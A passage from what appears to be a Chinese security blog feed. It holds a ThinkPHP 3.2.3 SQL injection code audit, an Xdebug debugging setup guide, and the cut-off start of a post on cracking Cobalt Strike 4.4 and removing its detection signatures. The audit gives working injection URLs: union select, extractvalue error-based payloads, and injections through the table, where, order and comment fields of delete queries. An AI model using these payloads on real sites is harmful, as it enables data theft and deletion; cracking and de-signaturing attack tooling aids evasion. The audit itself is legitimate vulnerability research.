variable">$field</span><span class="token operator">=&gt;</span><span class="token variable">$data</span><span class="token punctuation">)</span>                <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$field</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' = '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseValue</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$whereStr</span>   <span class="token operator">=</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token variable">$op</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token string single-quoted-string">'( '</span><span class="token operator">.</span><span class="token variable">$whereStr</span><span class="token operator">.</span><span class="token string single-quoted-string">' )'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，当<code>$key</code>  为 <code>_string</code>时，直接将 <code>$val</code> 复制给 <code>$whereStr</code></p><p>最后 拼接在了一对 括号 里面返回，所以这里又有了另外一种payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">http</span><span class="token punctuation">:</span><span class="token comment">//127.0.0.1/index.php?s=/Home/index/test&amp;id[where][_string]=0) union select 1,2,user() %23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;thinkad id="ad_55e75dfae343f5a1"&gt;&lt;/thinkad&gt;&lt;script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"&gt;&lt;/script&gt;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><p>table部分</p><pre class="line-numbers language-none"><code class="language-none">#报错http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]= &amp;id[table]=users where extractvalue(0x7e, concat(0x7e, version())) %23#逻辑判断http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]= &amp;id[table]=users where 1=1 %23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>where部分</p><pre class="line-numbers language-none"><code class="language-none">#报错http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=extractvalue(0x7e,concat(0x7e,version()))#逻辑判断http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=1=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>order部分</p><pre class="line-numbers language-none"><code class="language-none">#报错http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=1!=1&amp;id[order]=extractvalue(0x7e, concat(0x7e, version())) %23#逻辑判断http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=1!=1&amp;id[order]=1=1 %23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>limit部分</p><pre class="line-numbers language-none"><code class="language-none">#限于5.0.0&lt; MySQL &lt;5.6.6版本才能使用#报错http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=1!=1&amp;id[order]=extractvalue(0x7e, concat(0x7e, version())) %23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>comment部分</p><pre class="line-numbers language-none"><code class="language-none">#报错http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]= &amp;id[comment]=*/extractvalue(0x7e,concat(0x7e, version())) %23#逻辑判断http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]= &amp;id[comment]=*/1=1 %23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>delete</code>函数和<code>select/find</code>函数类似，直接进入 <code>delete</code> 函数</p><p>在解析完<code>$options</code>之后，还对<code>$options['where']</code>判断了一下是否为空，</p><p>所以<code>where</code>需要我们传一下值</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">      <span class="token variable">$options</span> <span class="token operator">=</span>  <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">_parseOptions</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token comment">// 如果条件为空 不进行删除操作 除非设置 1=1</span>          <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token operator">...</span><span class="token operator">...</span>      <span class="token variable">$result</span>  <span class="token operator">=</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">db</span><span class="token operator">-&gt;</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token operator">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后跟进 <code>$this-&gt;db-&gt;delete($options)</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">model</span>  <span class="token operator">=</span>   <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'model'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseBind</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$table</span>  <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseTable</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'table'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span>    <span class="token operator">=</span>   <span class="token string single-quoted-string">'DELETE FROM '</span><span class="token operator">.</span><span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token string single-quoted-string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">// 多表删除支持USING和JOIN操作</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'using'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$sql</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">' USING '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseTable</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'using'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$sql</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseJoin</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$sql</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token string single-quoted-string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">// 单表删除支持order和limit</span>        <span class="token variable">$sql</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseOrder</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>        <span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseLimit</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$sql</span> <span class="token operator">.=</span>   <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseComment</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fetch_sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token argument-name">true</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在跟进到 <code>parseWhere</code> </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 直接使用字符串条件</span>        <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token variable">$where</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token comment">// 使用数组表达式</span>    <span class="token operator">...</span><span class="token operator">.</span><span class="token operator">.</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$whereStr</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string single-quoted-string">''</span><span class="token punctuation">:</span><span class="token string single-quoted-string">' WHERE '</span><span class="token operator">.</span><span class="token variable">$whereStr</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终在前面拼接了 <code>WHERE</code> 直接返回，无任何过滤</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">http</span><span class="token punctuation">:</span><span class="token comment">//192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=extractvalue(0x7e,concat(0x7e,version()))</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如何在table部分注入,需要吧<code>parseWhere</code> 方法里面最后拼接的 <code>WHERE</code> 给注释掉，否早语法报错</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">http</span><span class="token punctuation">:</span><span class="token comment">//192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=123&amp;id[table]=users where extractvalue(0x7e, concat(0x7e, version())) %23</span><span class="token comment">// 最终拼接的语句</span><span class="token constant">DELETE</span> <span class="token constant">FROM</span> users where <span class="token function">extractvalue</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token function">version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># WHERE 123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnblogs.com/Article-kelp/p/15417199.html">ThinkPHP3.2.3代码审计 - Article_kelp - 博客园</a></p><p><a href="https://xz.aliyun.com/t/2631">thinkphp3.2_find_select_delete注入 - 先知社区</a></p><p><a href="https://xz.aliyun.com/t/2629">ThinkPHP3.2 框架sql注入漏洞分析(2018-08-23) - 先知社区</a></p><p><a href="https://www.t00ls.com/articles-51907.html">Thinkphp3.x/5.x系列漏洞总结学习 - T00ls.Com</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> php </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计—环境搭建</title>
      <link href="posts/30292.html"/>
      <url>posts/30292.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong>采用Phpstorm+Phpstudy+XDebug</strong></p><p><strong>相关链接：</strong></p><p><a href="https://www.jetbrains.com/phpstorm/download/#section=windows">Download PhpStorm: Lightning-Smart PHP IDE</a></p><p><a href="https://www.xp.cn/">小皮面板(phpstudy) - 让天下没有难配的服务器环境！</a></p><h1 id="0x01-phpstudy配置"><a href="#0x01-phpstudy配置" class="headerlink" title="0x01 phpstudy配置"></a>0x01 phpstudy配置</h1><p>先添加一个网站</p><p><img src="https://raw.githubusercontents.com/bewhale/img/master/img20220220015659.png"></p><p><strong>Xdebug配置</strong>  </p><p>phpstudy默认自带Xdebug，找到对应版本的php设置里面打开即可，自己设置一个监听端口</p><p><img src="https://raw.githubusercontents.com/bewhale/img/master/img20220220014133.png"></p><h1 id="0x02-PHPStorm配置"><a href="#0x02-PHPStorm配置" class="headerlink" title="0x02 PHPStorm配置"></a>0x02 PHPStorm配置</h1><p>phpstorm配置php，选择phpstudy中使用的php路径</p><p><img src="https://raw.githubusercontents.com/bewhale/img/master/img20220220020512.png"></p><p>配置Xdebug，端口为之前 phpstudy 配置的端口，保持一致</p><p><img src="https://raw.githubusercontents.com/bewhale/img/master/img20220220020756.png"></p><p>DBGp Proxy配置</p><p><img src="https://raw.githubusercontents.com/bewhale/img/master/img20220220022841.png"></p><p>IDE key  和  php.ini 的xdebug的 idekey  一致，默认为 <code>PHPSTORM</code></p><p>端口 和 设置的 xdebug 的 端口一致</p><p><strong>Servers设置</strong></p><p>调试器选xdebug</p><p><img src="https://raw.githubusercontents.com/bewhale/img/master/img20220220022905.png"></p><p>添加配置</p><p>新建php web page页面</p><p><img src="https://raw.githubusercontents.com/bewhale/img/master/img20220220024944.png"></p><p><strong>验证连接</strong></p><p><img src="https://raw.githubusercontents.com/bewhale/img/master/img20220220030127.png"></p><p>点击小电话 开始监听 以 调试</p><p><img src="https://raw.githubusercontents.com/bewhale/img/master/img20220220030749.png"></p><h1 id="0x03-浏览器配置"><a href="#0x03-浏览器配置" class="headerlink" title="0x03 浏览器配置"></a>0x03 浏览器配置</h1><p>浏览器插件商店  搜索xdebug helper 安装即可</p><p>Edge浏览器插件下载地址：</p><p><a href="https://microsoftedge.microsoft.com/addons/detail/xdebug-helper/ggnngifabofaddiejjeagbaebkejomen">Xdebug helper - Microsoft Edge Addons</a></p><p>安装成功后右键进入扩展选项</p><p><img src="https://raw.githubusercontents.com/bewhale/img/master/img20220220030544.png"></p><p>在PHP的配置文件中对xdebug的设置需要特别注意，将<code>xdebug.remote_autostart</code>设置为off</p><p>如果设置为on，则会忽略在浏览器中是选择Debug还是Disable，都会自动进行调试</p><pre class="line-numbers language-none"><code class="language-none">;开启远程调试自动启动xdebug.remote_autostart = Off<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样，xdebug helper就设置好了</p><h1 id="0x04-遇到的问题"><a href="#0x04-遇到的问题" class="headerlink" title="0x04 遇到的问题"></a>0x04 遇到的问题</h1><h2 id="Phpstorm-XDEBUG调试的时候超时解决办法"><a href="#Phpstorm-XDEBUG调试的时候超时解决办法" class="headerlink" title="Phpstorm+XDEBUG调试的时候超时解决办法"></a>Phpstorm+XDEBUG调试的时候超时解决办法</h2><p>在使用Phpstorm+XDEBUG进行调试过程中，分析会花费较长时间，<br>有的时候还没有调试完连接就已经断开，<br>这时候就需要重新进入调试或者在函数深处继续打断点</p><p>可以修改超时时间来解决问题，修改完记得重启服务。</p><p><strong>方法一：</strong><br>在 apache 配置文件 <code>httpd.conf</code> 中增加如下配置，将超时时间改大一点  </p><pre class="line-numbers language-none"><code class="language-none">Timeout 3600FcgidIOTimeout 3600FcgidIdleTimeout 3600IPCConnectTimeout 3600IPCCommTimeout 3600<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>方法二：</strong><br>phpstudy 的话也可以在 <code>vhosts.conf </code>里面的配置文件中加上几句代码增加两行代码</p><pre class="line-numbers language-none"><code class="language-none">IPCConnectTimeout 300000IPCCommTimeout 300000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如下</p><pre class="line-numbers language-none"><code class="language-none">&lt;VirtualHost _default_:80&gt;    DocumentRoot "D:/phpstudy_pro/WWW"    FcgidInitialEnv PHPRC "D:/phpstudy_pro/Extensions/php/php5.6.9nts"    AddHandler fcgid-script .php    IPCConnectTimeout 300000    IPCCommTimeout 300000    FcgidWrapper "D:/phpstudy_pro/Extensions/php/php5.6.9nts/php-cgi.exe" .php  &lt;Directory "D:/phpstudy_pro/WWW"&gt;      Options FollowSymLinks ExecCGI      AllowOverride All      Order allow,deny      Allow from all      Require all granted  DirectoryIndex index.php index.html  &lt;/Directory&gt;  ErrorDocument 400 /error/400.html  ErrorDocument 403 /error/403.html  ErrorDocument 404 /error/404.html  ErrorDocument 500 /error/500.html  ErrorDocument 501 /error/501.html  ErrorDocument 502 /error/502.html  ErrorDocument 503 /error/503.html  ErrorDocument 504 /error/504.html  ErrorDocument 505 /error/505.html  ErrorDocument 506 /error/506.html  ErrorDocument 507 /error/507.html  ErrorDocument 510 /error/510.html&lt;/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>方法三：</strong><br>php.ini  增加 修改如下配置 </p><pre class="line-numbers language-none"><code class="language-none">xdebug.remote_cookie_expire_time = 3600max_execution_time=3600max_input_time=3600default_socket_timeout = 3600<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.jetbrains.com/help/phpstorm/configuring-xdebug.html#integrationWithProduct">Configure Xdebug | PhpStorm</a></p><p><a href="https://blog.51cto.com/u_13640989/2709976">phpstorm配置xdebug 3.0最新教程</a></p><p><a href="https://www.cnblogs.com/cxscode/p/7045944.html">phpstorm调试环境XDebug搭建</a></p><p><a href="https://www.cnblogs.com/cxfs/p/13084350.html">phpstorm 使用 Xdebug 调试代码</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> php </tag>
            
            <tag> 环境准备 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike4.4汉化破解及特征去除</title>
      <link href="posts/50202.html"/>
      <url>posts/50202.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-java境安装"><a href="#0x00-java境安装" class="headerlink" title="0x00 java境安装"></a>0x00 java境安装</h1><p>windows安装java就不多说，主要说下linux  </p><p>ORACLE 官网下载JDK 地址<br><a href="https://www.oracle.com/java/technologies/javase-jdk8-downloads.html">https://www.oracle.com/java/technologies/javase-jdk8-downloads.html</a></p><p>解压文件并移动至/opt</p><pre class="line-numbers language-none"><code class="language-none">tar -xzvf jdk-8u91-linux-x64.tar.gz -C /opt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置环境变量,<br>修改全局配置文件  </p><pre class="line-numbers language-none"><code class="language-none">sudo vim ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加下列内容  </p><pre class="line-numbers language-none"><code class="language-none">#set oracle jdk environmentexport JAVA_HOME=/opt/jdk1.8.0_251export JRE_HOME=${JAVA_HOME}/jreexport CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/libexport PATH=${JAVA_HOME}/bin:$PATH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>让配置文件生效</p><pre class="line-numbers language-none"><code class="language-none">source /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：该命令通常用命令“.”来替代，如：source .bash_rc 与 . .bash_rc 是等效的。</p><p>验证安装是否成功</p><pre class="line-numbers language-none"><code class="language-none">java  -version  显示java版本javac 有提示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果有软件还是找不到java环境，用update-alternatives设置管理java    </p><p>安装并注册, /opt/jdk1.8.0_91/替换为自己jdk目录，用update-alternatives管理java版本  </p><pre class="line-numbers language-none"><code class="language-none"># --install needs &lt;link&gt; &lt;name&gt; &lt;path&gt; &lt;priority&gt;update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_91/bin/java 1update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_91/bin/javac 1若需要其他的就用相同的方法安装如下sudo update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_91/bin/java 50sudo update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_91/bin/javac 50sudo update-alternatives --install /usr/bin/javah javah /opt/jdk1.8.0_91/bin/javah 50sudo update-alternatives --install /usr/bin/javaws javaws /opt/jdk1.8.0_91/bin/javaws 50sudo update-alternatives --install /usr/bin/javap javap /opt/jdk1.8.0_91/bin/javap 50update-alternatives --set java /opt/jdk1.8.0_91/bin/javaupdate-alternatives --set javac /opt/jdk1.8.0_91/bin/javac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看安装结果</p><pre class="line-numbers language-none"><code class="language-none">update-alternatives --config javaupdate-alternatives --config javac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Ubuntu安装java后，提示</p><pre class="line-numbers language-none"><code class="language-none">[-] keytool is not in $PATH    install the Java Developer Kit建立一个软连接即可  /usr/java/jdk/替换为自己的jdk目录ln -s /usr/java/jdk/bin/keytool /usr/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x01-CS下载、破解与汉化"><a href="#0x01-CS下载、破解与汉化" class="headerlink" title="0x01 CS下载、破解与汉化"></a>0x01 CS下载、破解与汉化</h1><h2 id="官方包下载"><a href="#官方包下载" class="headerlink" title="官方包下载"></a>官方包下载</h2><p><a href="https://github.com/k8gege/Aggressor/releases/download/cs/CobaltStrike_4.4_000.jar">CobaltStrike4.4 官方包下载</a></p><p>官方hash验证地址：<br><a 